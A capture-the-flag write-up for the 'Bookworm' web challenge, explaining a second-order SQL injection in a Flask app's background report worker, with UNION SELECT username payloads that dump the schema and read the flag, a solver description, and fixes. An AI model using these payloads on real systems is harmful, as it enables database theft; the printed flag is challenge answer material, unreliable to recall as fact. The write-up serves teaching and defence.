# Bookworm

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 351 |
| Author | denny |
| Connection | `http://chal.thjcc.org:31279/` |
| Interactive writeup | [Second-Order Bookworm — read-oracle console](https://claude.ai/code/artifact/d4d2dec2-24a8-48cc-9298-c549207a6cbb) |
| Flag | `THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c}` |

> I built a great website for tracking my reading.

## TL;DR

A Flask reading tracker. Sign-up and login are parameterised (SQLi-safe), so the
**username is stored verbatim**. But clicking *"Generate reading report"* kicks
off an **asynchronous background worker** that reads your username back out and
concatenates it straight into a raw SQL query. That's a **second-order SQL
injection**: the payload sits dormant in your username until the worker runs.
UNION-inject three columns and the worker writes them into your downloadable CSV.
The flag lives in a decoy-named table:

```
"bjB0aDFuZ190MF9zMzNfaDNyMw=="  ==  base64("n0th1ng_t0_s33_h3r3")   -- (name, value)
```

Register username
`x' UNION SELECT name, value, 3 FROM "bjB0aDFuZ190MF9zMzNfaDNyMw=="-- -`, log in,
generate a report, download it → the flag is a "book" row.

## 1. Mapping the App

Standard Flask (`Werkzeug/2.2.3`, Python 3.11). Flow:

- `POST /signup` — `username`, `email`, `password`.
- `POST /login` — sets a *signed* Flask session `{"username": ...}`.
- `/shelf` — add a book (`title`, `author`, `rating`), list books, delete, and
  **Generate reading report** (`POST /generate_report`).
- `/inbox` — lists generated reports. Each row leaks the **absolute server path**
  and a download link:

  ```
  Reading report — 16/08/2026 …   /app/reports/reading_<username>_<ms>.csv   /download_report/<id>
  ```

- `/download_report/<id>` — `send_file` of that CSV, **ownership-checked** (you
  only get your own reports).

The report is generated **asynchronously** — the UI says *"Your report is being
generated — check your inbox in a moment"*, and the row appears a second or two
later. That word *asynchronous* is the whole challenge: a worker, separate from
the request, does the dangerous work.

## 2. Ruling Out the Decoys

A lot here is built to look vulnerable and isn't:

- **The report filename** is derived from the username but **sanitised to
  `[A-Za-z0-9]`**. Empirically: `aa{{7*7}}bb → aa77bb`, `../../etc/x → etcx`,
  `x....//....//y → xy`. So no SSTI (`{{7*7}}` becomes `77`, not `49`), no path
  traversal, no filename injection. The leaked absolute path is bait.
- **`download_report`** is ownership-checked (other users' ids → 404), the path
  is the sanitised one, and there's no static `/reports/` route — so no
  IDOR / LFI there.
- **Login is not SQL-injectable** (`admin'--` etc. just fail), the Flask
  `SECRET_KEY` is **not** in the flask-unsign wordlist (no session forgery), and
  signup mass-assignment (`role=admin`, …) does nothing.

Every "front-door" sink is safe. The one place left is the part that runs *later*.

## 3. Second-Order SQL Injection in the Worker

Usernames accept **any** characters at signup (`;`, `$()`, `/`, `..`, quotes are
all accepted), and are stored verbatim because the insert is parameterised. The
tell is a single quote: a username containing `'` **breaks report generation**
(the inbox row never appears) while the same username logs in fine. Login is
parameterised; the worker is not. The worker runs something like:

```sql
SELECT title, author, rating FROM books WHERE username = '<username>'
```

built by string concatenation. The injection only fires when the **worker**
reads the stored username back — a textbook second-order injection. Since the
result set becomes the three CSV columns, a `UNION SELECT` of three columns
exfiltrates anything.

### Dumping the schema

Register username:

```
zq' UNION SELECT name, sql, 3 FROM sqlite_master-- -
```

log in, `POST /generate_report`, then download the report. The CSV now contains
the whole schema — including a table with a **base64 name**:

```csv
title,author,rating
bjB0aDFuZ190MF9zMzNfaDNyMw==,"CREATE TABLE ""bjB0aDFuZ190MF9zMzNfaDNyMw=="" (
            name  TEXT PRIMARY KEY,
            value TEXT NOT NULL )",3
books,"CREATE TABLE books ( … username TEXT NOT NULL … )",3
users,"CREATE TABLE users ( … )",3
…
```

```
$ echo -n bjB0aDFuZ190MF9zMzNfaDNyMw== | base64 -d
n0th1ng_t0_s33_h3r3
```

The table is *named* with the base64 string (its decoded value, "nothing to see
here", is the joke). Its `(name, value)` shape screams "flag store".

## 4. Extracting the Flag

Register username:

```
x' UNION SELECT name, value, 3 FROM "bjB0aDFuZ190MF9zMzNfaDNyMw=="-- -
```

(the table name needs SQL double-quotes because of the `==`), log in, generate a
report, download it:

```csv
title,author,rating
flag,THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c},3
```

## 5. Solver

[`solve.py`](solve.py) automates the whole thing with the standard library only
— it registers a UNION username, drives signup → login → generate → download,
and prints the flag (it first dumps the schema to locate the table, then reads
it):

```bash
python3 solve.py                       # defaults to the challenge URL
```

```
[*] dumping schema via UNION on sqlite_master ...
    tables: bjB0aDFuZ190MF9zMzNfaDNyMw==, books, inbox, reports, users, …
[*] reading the flag table "bjB0aDFuZ190MF9zMzNfaDNyMw==" ...
flag,THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c},3

[+] flag: THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c}
```

> Operational note: each report spawns a worker thread; firing hundreds in a
> tight loop can exhaust the instance. The solver generates only two reports.

## Why It Works

- **Sanitise once, use twice.** The username is cleaned for the *filename* but
  used raw for the *query*. A value is only as safe as its **most dangerous**
  consumer, and the two consumers here disagree — exactly the class of bug the
  get-file challenges also exploit, one abstraction up.
- **Second-order means the guard is in the wrong place.** All the visible
  request handlers parameterise their SQL, so black-box SQLi on login/signup
  finds nothing. The injection detonates in a *different process* at a *later
  time*, where the data is (wrongly) trusted as "already stored, therefore safe".
- **The output channel is the report.** Because the worker's query result *is*
  the CSV, a UNION turns the reporting feature into a generic read oracle over
  the whole database.

## The Fix

- **Parameterise everywhere**, including background jobs. Never rebuild a query
  from a stored value with string formatting.
- **Treat stored data as untrusted** on the way *out*, not just on the way in;
  second-order injection is exactly the failure of "it's in the DB, so it's
  clean".
- Constrain usernames to a sane charset at registration (defence in depth), and
  don't leak absolute server paths in the UI.

## Flag

```text
THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c}
```
